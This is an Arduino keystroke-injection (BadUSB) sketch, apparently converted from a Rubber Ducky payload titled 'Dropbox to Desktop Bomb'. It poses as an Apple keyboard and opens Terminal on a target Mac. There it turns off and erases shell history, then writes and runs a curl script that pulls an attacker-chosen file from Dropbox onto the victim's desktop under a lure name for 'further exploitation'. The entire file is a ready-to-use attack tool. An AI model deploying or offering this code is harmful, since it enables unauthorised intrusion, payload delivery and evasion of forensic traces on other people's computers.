// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // This script can be used to download files from dropbox to a target MacOs Desktop.
  // files downloaded to the desktop can be used to trigger more complex scripts for further exploitation
  // Author: Narsty
  // Title: Dropbox to Desktop Bomb
  // Version 1.0 MacOs
  // Category: Execution
  // Replace the "<API ACCESS TOKEN HERE>" Placeholder with your actual Dropbox API token
  // Replace "<DROPBOX URL HERE>" with the URL of the dropbox file
  // Replace the "<CLICK ME.mp4>"  placeholder
  // with what you want the name of the file to be on the target desktop
  // Must include file format (.jpeg .doc .txt .mp4)
  // ID 05ac:021e Apple:Keyboard
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo -e \"export HISTCONTROL=ignorespace\\nunset HISTFILE\" >> ~/.bashrc && source ~/.bashrc && exec bash");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')");

  delay(500);

  typeKey(KEY_RETURN);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print(" cd ~/Desktop");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" echo 'ACCESS_TOKEN=\"<API ACCESS TOKEN HERE>\"; DOWNLOAD_URL=\"<DROPBOX URL HERE>\"; SAVE_PATH=\"$HOME/Desktop/<CLICK ME.mp4>\"; curl -L -o \"$SAVE_PATH\" --header \"Authorization: Bearer $ACCESS_TOKEN\" \"$DOWNLOAD_URL\"' > download.sh");

  delay(500);

  Keyboard.print(" chmod +x download.sh");

  delay(500);

  Keyboard.print(" ./download.sh");

  delay(250);

  typeKey(KEY_RETURN);

  delay(7000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}